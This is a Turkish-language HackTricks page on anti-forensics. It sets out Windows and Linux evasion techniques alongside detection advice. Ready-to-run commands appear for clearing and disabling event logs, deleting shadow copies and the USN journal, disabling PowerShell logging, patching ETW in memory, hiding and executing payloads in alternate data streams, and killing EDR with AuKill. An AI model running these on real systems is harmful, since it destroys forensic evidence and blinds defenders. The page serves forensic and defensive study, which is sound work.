# Anti-Forensic Techniques

{{#include ../../banners/hacktricks-training.md}}

## Timestamps

Bir saldırgan, tespit edilmemek için **dosyaların zaman damgalarını değiştirmekle** ilgilenebilir.\
Zaman damgalarını MFT içinde, `$STANDARD_INFORMATION` \_\_ ve \_\_ `$FILE_NAME` özniteliklerinde bulmak mümkündür.

Her iki öznitelikte de 4 zaman damgası bulunur: **Değiştirilme**, **erişim**, **oluşturulma** ve **MFT kayıt değiştirilme** (MACE veya MACB).

**Windows Gezgini** ve diğer araçlar, **`$STANDARD_INFORMATION`** içindeki bilgileri gösterir.

### TimeStomp - Anti-forensic Tool

Bu araç, **`$STANDARD_INFORMATION`** içindeki zaman damgası bilgilerini **değiştirir**, **ancak** **`$FILE_NAME`** içindeki bilgileri **değiştirmez**. Bu nedenle, **şüpheli** **etkinlikleri** **tespit etmek** mümkündür.

### Usnjrnl

**USN Journal** (Update Sequence Number Journal), birim değişikliklerini izleyen NTFS (Windows NT dosya sistemi) özelliğidir. [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) aracı bu değişikliklerin incelenmesini sağlar.

![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal (Update Sequence Number Journal), birim değişikliklerini izleyen NTFS (Windows NT dosya sistemi) özelliğidir. ...](<../../images/image (801).png>)

Önceki görsel, dosyada bazı **değişiklikler yapıldığının** gözlemlenebildiği **araç** çıktısını gösterir.

### $LogFile

Bir dosya sistemindeki **tüm metadata değişiklikleri**, [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging) olarak bilinen bir süreçle günlüğe kaydedilir. Günlüğe kaydedilen metadata, NTFS dosya sisteminin kök dizininde bulunan `**$LogFile**` adlı bir dosyada tutulur. Bu dosyayı ayrıştırmak ve değişiklikleri belirlemek için [LogFileParser](https://github.com/jschicht/LogFileParser) gibi araçlar kullanılabilir.

![Usnjrnl - $LogFile: Bir dosya sistemindeki tüm metadata değişiklikleri, write-ahead logging olarak bilinen bir süreçle günlüğe kaydedilir. Günlüğe kaydedilen metadata, NTFS dosya sisteminin kök dizininde bulunan $LogFile adlı bir dosyada tutulur...](<../../images/image (137).png>)

Yine, aracın çıktısında **bazı değişiklikler yapıldığını** görmek mümkündür.

Aynı aracı kullanarak zaman damgalarının **hangi zaman için değiştirildiğini** belirlemek mümkündür:

![Usnjrnl - $LogFile: Aynı aracı kullanarak zaman damgalarının hangi zaman için değiştirildiğini belirlemek mümkündür](<../../images/image (1089).png>)

- CTIME: Dosyanın oluşturulma zamanı
- ATIME: Dosyanın değiştirilme zamanı
- MTIME: Dosyanın MFT kayıt değiştirilme zamanı
- RTIME: Dosyanın erişim zamanı

### `$STANDARD_INFORMATION` ve `$FILE_NAME` karşılaştırması

Şüpheli şekilde değiştirilmiş dosyaları belirlemenin başka bir yolu, **uyuşmazlıkları** bulmak için her iki öznitelikteki zamanları karşılaştırmaktır.

### Nanoseconds

**NTFS** zaman damgalarının **hassasiyeti** **100 nanosaniyedir**. Bu nedenle, 2010-10-10 10:10:**00.000:0000 gibi zaman damgalarına sahip dosyaların bulunması çok şüphelidir**.

### SetMace - Anti-forensic Tool

Bu araç, hem `$STARNDAR_INFORMATION` hem de `$FILE_NAME` özniteliklerini değiştirebilir. Ancak Windows Vista'dan itibaren bu bilgiyi değiştirmek için canlı bir işletim sistemi gerekir.

## Data Hiding

NTFS, kümeler ve minimum bilgi boyutunu kullanır. Bu, bir dosya bir buçuk küme kullanıyorsa, **kalan yarının dosya silinene kadar asla kullanılmayacağı** anlamına gelir. Böylece, **bu slack space içinde veri gizlemek** mümkündür.

slacker gibi araçlar, bu "gizli" alanda veri gizlemeye olanak tanır. Ancak `$logfile` ve `$usnjrnl` incelemesi, bazı verilerin eklendiğini gösterebilir:

![SetMace - Anti-forensic Tool - Data Hiding: slacker gibi araçlar, bu "gizli" alanda veri gizlemeye olanak tanır. Ancak $logfile ve $usnjrnl incelemesi bazı verilerin eklendiğini gösterebilir...](<../../images/image (1060).png>)

Ardından, FTK Imager gibi araçlarla slack space içeriğini almak mümkündür. Bu tür araçların içeriği gizlenmiş veya hatta şifrelenmiş biçimde kaydedebileceğini unutmayın.

## UsbKill

Bu araç, USB portlarında herhangi bir değişiklik algılanırsa bilgisayarı **kapatır**.\
Bunu tespit etmenin bir yolu, çalışan süreçleri incelemek ve **çalışan her Python betiğini gözden geçirmektir**.

## Live Linux Distributions

Bu dağıtımlar **RAM** içinde **çalıştırılır**. Bunları tespit etmenin tek yolu, **NTFS dosya sistemi yazma izinleriyle bağlanmışsa** ortaya çıkar. Yalnızca okuma izinleriyle bağlanmışsa izinsiz girişi tespit etmek mümkün olmaz.

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

### Delayed Windows self-deletion

Çalışan bir Windows imajı, süreci etkin olduğu sürece kilitli olabilir. Bir süreç, silme işlemini alt süreç olarak başlattığı `cmd.exe`'ye devredebilir, zamanlayıcı olarak `choice` kullanabilir ve kabuk `del` komutuna ulaşmadan önce sonlanabilir. Gecikme, özgün sürecin imaj tanıtıcısını serbest bırakmasını sağlar; yol boşluk içeriyorsa tam yolu tırnak içine almak gerekir.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

```cmd
cmd.exe /C choice /C Y /N /D Y /T 6 ^>nul ^& Del /F /Q "<full-path-of-current-executable>"
```

Bu dize başka bir etkileşimli `cmd` isteminden yazılmak yerine doğrudan `cmd.exe`'ye argüman olarak verildiğinde `^&` yerine `&`, `^>nul` yerine `>nul` kullanın. Bu, dizin girdisini kaldırır; **güvenli silme değildir** ve yürütme, görev, dosya sistemi günlüğü veya diğer adli izleri kaldırmaz. Komut satırı `choice /T`, `Del` ve üst sürecin imaj yolunu bir arada içeren kısa ömürlü `cmd.exe` alt süreçlerini araştırın.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

## Windows Yapılandırması

Adli incelemeyi çok daha zor hâle getirmek için Windows'taki çeşitli günlükleme yöntemlerini devre dışı bırakmak mümkündür.

### Zaman Damgalarını Devre Dışı Bırakma - UserAssist

Bu kayıt defteri anahtarı, kullanıcı tarafından her yürütülebilir dosyanın çalıştırıldığı tarih ve saatleri tutar.

UserAssist'i devre dışı bırakmak iki adım gerektirir:

1. UserAssist'i devre dışı bırakmak istediğimizi belirtmek için `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` ve `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` adlı iki kayıt defteri anahtarını da sıfıra ayarlayın.
2. `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` biçimindeki kayıt defteri alt ağaçlarını temizleyin.

### Zaman Damgalarını Devre Dışı Bırakma - Prefetch

Bu, Windows sisteminin performansını artırmak amacıyla yürütülen uygulamalar hakkındaki bilgileri kaydeder. Ancak bu bilgiler adli incelemelerde de işe yarayabilir.

- `regedit` komutunu çalıştırın
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters` dosya yolunu seçin
- Hem `EnablePrefetcher` hem de `EnableSuperfetch` öğesine sağ tıklayın
- Her birinde Değiştir'i seçip değeri 1'den (veya 3'ten) 0'a değiştirin
- Yeniden başlatın

### Zaman Damgalarını Devre Dışı Bırakma - Son Erişim Zamanı

Windows NT sunucusunda bir NTFS birimindeki klasör açıldığında sistem, son erişim zamanı adı verilen **her listelenen klasördeki zaman damgası alanını günceller**. Yoğun kullanılan bir NTFS biriminde bu, performansı etkileyebilir.

1. Kayıt Defteri Düzenleyicisi'ni (Regedit.exe) açın.
2. `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem` konumuna gidin.
3. `NtfsDisableLastAccessUpdate` öğesini bulun. Yoksa bu DWORD'u ekleyip değerini 1 olarak ayarlayın; böylece işlem devre dışı bırakılır.
4. Kayıt Defteri Düzenleyicisi'ni kapatın ve sunucuyu yeniden başlatın.

### USB Geçmişini Silme

Tüm **USB Aygıtı Girdileri**, bilgisayarınıza veya dizüstü bilgisayarınıza bir USB aygıtı takıldığında oluşturulan alt anahtarları içeren **USBSTOR** kayıt defteri anahtarı altında Windows Kayıt Defteri'nde saklanır. Bu anahtarı H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR` konumunda bulabilirsiniz. **Bu anahtarı silmek** USB geçmişini siler.\
Bunları sildiğinizden emin olmak (ve silmek) için [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) aracını da kullanabilirsiniz.

USB'ler hakkında bilgi kaydeden başka bir dosya da `C:\Windows\INF` içindeki `setupapi.dev.log` dosyasıdır. Bu dosya da silinmelidir.

### Shadow Copies'i Devre Dışı Bırakma

Shadow copies'i `vssadmin list shadowstorage` komutuyla **listeleyin**\
`vssadmin delete shadow` komutunu çalıştırarak **silin**

[https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html) adresinde önerilen adımları izleyerek bunları GUI üzerinden de silebilirsiniz.

Shadow copies'i devre dışı bırakmak için [buradaki adımlar](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Windows başlat düğmesine tıkladıktan sonra metin arama kutusuna "services" yazıp Hizmetler programını açın.
2. Listeden "Volume Shadow Copy" öğesini bulup seçin, ardından sağ tıklayarak Özellikler'e gidin.
3. "Startup type" açılır menüsünden Disabled'ı seçin ve ardından Uygula ile Tamam'a tıklayarak değişikliği onaylayın.

Kayıt defterindeki `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` konumundan shadow copy'ye hangi dosyaların kopyalanacağını yapılandırmak da mümkündür.

### Silinen dosyaların üzerine yazma

- Bir **Windows aracı** kullanabilirsiniz: `cipher /w:C`. Bu komut, C sürücüsünde kullanılabilir durumdaki ayrılmamış disk alanındaki verileri kaldırması için cipher'a talimat verir.
- [**Eraser**](https://eraser.heidi.ie) gibi araçları da kullanabilirsiniz.

### Windows olay günlüklerini silme

- Windows + R --> eventvwr.msc --> "Windows Logs" bölümünü genişletin --> Her kategoriye sağ tıklayıp "Clear Log" seçeneğini belirleyin
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Windows olay günlüklerini devre dışı bırakma

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Hizmetler bölümünden "Windows Event Log" hizmetini devre dışı bırakın
- `WEvtUtil.exec clear-log` veya `WEvtUtil.exe cl`

### $UsnJrnl'ı Devre Dışı Bırakma

- `fsutil usn deletejournal /d c:`

---

## Gelişmiş Günlükleme ve İzleri Tahrif Etme (2023-2025)

### PowerShell ScriptBlock/Module Logging

Windows 10/11'in ve Windows Server'ın güncel sürümleri, `Microsoft-Windows-PowerShell/Operational` altında **zengin PowerShell adli inceleme verileri** (4104/4105/4106 olayları) tutar.  
Saldırganlar bunları anlık olarak devre dışı bırakabilir veya silebilir:

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

Savunmacılar bu kayıt defteri anahtarlarındaki değişiklikleri ve PowerShell olaylarının yüksek hacimli silinmesini izlemelidir.

### ETW (Event Tracing for Windows) Yaması

Uç nokta güvenlik ürünleri büyük ölçüde ETW'ye dayanır. 2024'te yaygınlaşan bir kaçınma yöntemi, bellekteki `ntdll!EtwEventWrite`/`EtwEventWriteFull` işlevlerini yamalayarak her ETW çağrısının olayı oluşturmadan `STATUS_SUCCESS` döndürmesini sağlamaktır:<sup>[[5]](#references)</sup>

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Public PoC'ler (ör. `EtwTiSwallow`) aynı primitive'i PowerShell veya C++ ile uygular.  
Patch **process-local** olduğundan, diğer process'lerde çalışan EDR'ler bunu gözden kaçırabilir.<sup>[[5]](#references)</sup>
Tespit: bellekteki `ntdll` ile diskteki `ntdll`'yi karşılaştırın veya user-mode öncesinde hook koyun.

### Alternate Data Streams (ADS) Canlanışı

2023'teki malware kampanyalarında (ör. **FIN12** loader'ları), geleneksel tarayıcılardan gizlenmek için ikinci aşama binary'lerini ADS içinde sakladıkları görüldü:

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

Akışları `dir /R`, `Get-Item -Stream *` veya Sysinternals `streams64.exe` ile listeleyin.
Ana dosyayı FAT/exFAT'e ya da SMB üzerinden kopyalamak gizli akışı kaldırır; bu durum
araştırmacıların payload'u kurtarmak için kullanabileceği bir yöntemdir.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver, ransomware saldırılarında **anti-forensics** amacıyla artık
rutin olarak kullanılıyor.  
Açık kaynaklı **AuKill** aracı, imzalı ancak güvenlik açığı bulunan bir sürücüyü (`procexp152.sys`)
yükleyerek **şifreleme ve logların yok edilmesinden önce** EDR ve adli bilişim sensörlerini askıya alır
veya sonlandırır:<sup>[[1]](#references)</sup>

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

Sürücü daha sonra kaldırılır ve geride çok az iz bırakır.<sup>[[1]](#references)</sup>  
Azaltma önlemleri: Microsoft'un savunmasız sürücü engelleme listesini (HVCI/SAC) etkinleştirin ve kullanıcıların yazabildiği konumlardan kernel-service oluşturulmasını izleyip uyarı verin.

---

## Linux Anti-Forensics: Self‑patching and Cloud C2 (2023–2025)

### Tespiti azaltmak için ele geçirilmiş servislerde self‑patching (Linux)
Saldırganlar, hem servisin yeniden exploit edilmesini önlemek hem de zafiyet temelli tespitleri bastırmak için servisi exploit ettikten hemen sonra giderek daha sık “self‑patch” uyguluyor. Amaç, savunmasız bileşenleri en güncel ve meşru upstream binary/JAR dosyalarıyla değiştirerek tarayıcıların hostun yamalı olduğunu bildirmesini sağlarken persistence ve C2'yi sürdürmektir.<sup>[[3]](#references)</sup>

Örnek: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Exploit sonrası saldırganlar Maven Central'dan (repo1.maven.org) meşru JAR dosyaları indirdi, ActiveMQ kurulumundaki savunmasız JAR dosyalarını sildi ve broker'ı yeniden başlattı.
- Bu işlem, diğer foothold'ları (cron, SSH yapılandırma değişiklikleri, ayrı C2 implantları) korurken ilk RCE açığını kapattı.

Operasyonel örnek (temsili)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

Forensic/hunting ipuçları
- Servis dizinlerinde planlanmamış binary/JAR değişikliklerini inceleyin:
  - Debian/Ubuntu: `dpkg -V activemq` komutunu çalıştırın ve dosya hash'lerini/yollarını repo mirror'larıyla karşılaştırın.
  - RHEL/CentOS: `rpm -Va 'activemq*'`
  - Diskte bulunan ancak paket yöneticisine ait olmayan JAR sürümlerini veya bant dışı güncellenmiş symbolic link'leri arayın.
- Zaman çizelgesi: ctime/mtime değerlerini ihlal aralığıyla ilişkilendirmek için `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` komutunu kullanın.
- Shell history/process telemetry: ilk exploitation'ın hemen ardından `repo1.maven.org` veya diğer artifact CDN'lerine `curl`/`wget` kullanıldığına dair kanıtları arayın.
- Change management: yalnızca patched sürümün mevcut olduğunu değil, “patch”i kimin ve neden uyguladığını da doğrulayın.

### Bearer token'lar ve anti-analysis stager'larla Cloud hizmeti C2
Gözlemlenen tradecraft, birden fazla uzun süreli C2 yolunu ve anti-analysis paketlemesini bir araya getiriyordu:<sup>[[3]](#references)</sup>
- Sandboxing ve static analysis'ı zorlaştırmak için parola korumalı PyInstaller ELF loader'ları (ör. encrypted PYZ, `/_MEI*` altına geçici çıkarma).
  - Göstergeler: `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS` gibi `strings` sonuçları.
  - Runtime artifact'ları: `/tmp/_MEI*` altına veya özel `--runtime-tmpdir` yollarına çıkarma.
- Hardcoded OAuth Bearer token'lar kullanan Dropbox tabanlı C2
  - Network göstergeleri: `Authorization: Bearer <token>` içeren `api.dropboxapi.com` / `content.dropboxapi.com` bağlantıları.
  - Genellikle dosya senkronize etmeyen sunucu iş yüklerinden Dropbox domain'lerine giden HTTPS trafiğini proxy/NetFlow/Zeek/Suricata'da araştırın.
- Bir kanalın engellenmesi durumunda kontrolü korumak için tunneling üzerinden paralel/yedek C2 (ör. Cloudflare Tunnel `cloudflared`).
  - Host IOC'leri: `cloudflared` process/unit'leri, `~/.cloudflared/*.json` konumundaki config ve Cloudflare edge'lerine giden outbound 443 trafiği.

### Erişimi sürdürmek için persistence ve “hardening rollback” (Linux örnekleri)
Saldırganlar, kalıcı erişim yollarını sıklıkla self-patching ile birlikte kullanır:<sup>[[3]](#references)</sup>
- Cron/Anacron: periyodik çalıştırma için her `/etc/cron.*/` dizinindeki `0anacron` stub'ında değişiklikler.
  - Araştırma:
    ```bash
    for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
    grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
    ```
- SSH yapılandırması hardening geri alma: root login'lerini etkinleştirme ve düşük ayrıcalıklı hesapların varsayılan shell'lerini değiştirme.
  - Root login'lerinin etkinleştirilmesini araştırın:
    ```bash
    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
    # flag values like "yes" or overly permissive settings
    ```
  - Sistem hesaplarındaki (örn. `games`) şüpheli etkileşimli shell'leri araştırın:
    ```bash
    awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
    ```
- Diske bırakılan ve cloud C2 ile de iletişim kuran rastgele, kısa adlı beacon artefaktları (8 alfabetik karakter):
  - Ara:
    ```bash
    find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
      -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
    ```

Savunmacılar, ilk exploit girişimini gizlemek için kullanılan anti-forensic öz düzeltme faaliyetlerini ortaya çıkarmak amacıyla bu bulguları dışa açık olma ve hizmet yamalama olaylarıyla ilişkilendirmelidir.

## References

- [1] [Sophos X-Ops – AuKill: EDR'yi devre dışı bırakmak için silah haline getirilmiş savunmasız bir sürücü (Mart 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Gizlilik için EtwEventWrite'ı yamalama: Tespit ve avcılık (Haziran 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Kalıcılık için yamalama: DripDropper Linux malware bulut içinde nasıl ilerliyor](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [.NET'inizi gizleme - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [6] [FortiGuard Labs – Meşru yazılıma gömülü bir SectopRAT varyantının ortaya çıkarılması](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [7] [Microsoft Learn – choice komutu](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/choice)
- [8] [Microsoft Learn – del komutu](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
{{#include ../../banners/hacktricks-training.md}}
